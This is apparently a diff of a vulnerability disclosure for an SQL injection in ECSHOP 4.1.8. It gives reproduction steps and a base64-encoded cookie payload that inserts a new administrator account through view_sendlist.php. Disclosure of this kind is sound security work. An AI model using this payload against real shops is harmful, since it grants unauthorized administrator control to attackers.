@@ -3,19 +3,18 @@
 ECSHOP, 4.1.8, SQL Injection
 
 Vulnerabilities Reproduction:
+Log in to the backend, visit the view_ sendlist.php, and then capture the packet.
 
-1. Log in to the backend, visit the view_ sendlist.php, and then capture the packet.
-
-2. Enter the SQL statement to be executed, and then convert it into base64 encoding. Here we take adding the test administrator user as an example.
+Enter the SQL statement to be executed, and then convert it into base64 encoding. Here we take adding the test administrator user as an example.
    
 <img width="415" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/235fd585-510c-48a4-b749-163d3765b972">
 
 Here is the base64 encoding.
 aW5zZXJ0IGludG8gZWNzX2FkbWluX3VzZXIodXNlcl9uYW1lLGVtYWlsLHBhc3N3b3JkLGFjdGlvbl9saXN0LG5hdl9saXN0LGFnZW5jeV9pZCkgdmFsdWVzKCd0ZXN0JywnMTIzMTIzQDEyMy5jb20nLCc0ZmNlZDlhYTY2YzQzZTVmYzg3ZDVmOTE3NjIwMWViMycsJzEnLCcxJywnMScpOyM=
 
-3. Get the value of ECSCP[lastfilterfile], here is F8F2F4EC.
+Get the value of ECSCP[lastfilterfile], here is F8F2F4EC.
 
-4. Send the request package, and replace the previous cookie, or  just add the following string to the original cookie.
+Send the request package, and replace the previous cookie, or  just add the following string to the original cookie.
 act=query&uselastfilter=1
 ECSCP[lastfiltersql]=aW5zZXJ0IGludG8gZWNzX2FkbWluX3VzZXIodXNlcl9uYW1lLGVtYWlsLHBhc3N3b3JkLGFjdGlvbl9saXN0LG5hdl9saXN0LGFnZW5jeV9pZCkgdmFsdWVzKCd0ZXN0JywnMTIzMTIzQDEyMy5jb20nLCc0ZmNlZDlhYTY2YzQzZTVmYzg3ZDVmOTE3NjIwMWViMycsJzEnLCcxJywnMScpOyM=;ECSCP[lastfilterfile]=F8F2F4EC;
 Successfully executed SQL statement.
